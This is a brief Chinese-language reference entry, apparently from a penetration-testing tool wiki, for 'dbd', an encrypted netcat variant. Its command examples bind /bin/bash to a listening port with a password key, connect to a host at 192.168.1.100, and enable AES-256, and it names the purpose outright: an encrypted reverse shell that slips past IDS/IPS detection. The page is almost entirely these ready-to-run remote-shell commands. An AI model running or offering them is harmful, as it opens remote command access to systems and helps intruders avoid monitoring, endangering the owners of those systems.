# dbd

## 简介
加密的 netcat，支持 AES 加密通信

## 核心参数
- `-l`: 监听模式
- `-e`: 执行命令
- `-k`: 加密密钥

## 命令示例
```bash
# 监听模式（加密）
dbd -l -p 4444 -e /bin/bash -k password

# 连接模式
dbd -c 192.168.1.100 -p 4444 -k password

# 使用 AES 加密
dbd -l -p 4444 -e /bin/bash -k password -a aes256
```

## 使用场景
建立加密反弹 shell，绕过 IDS/IPS 检测

## 所属分类
- [协议隧道 (Protocol Tunneling)](../categories/22-protocol-tunneling.md)
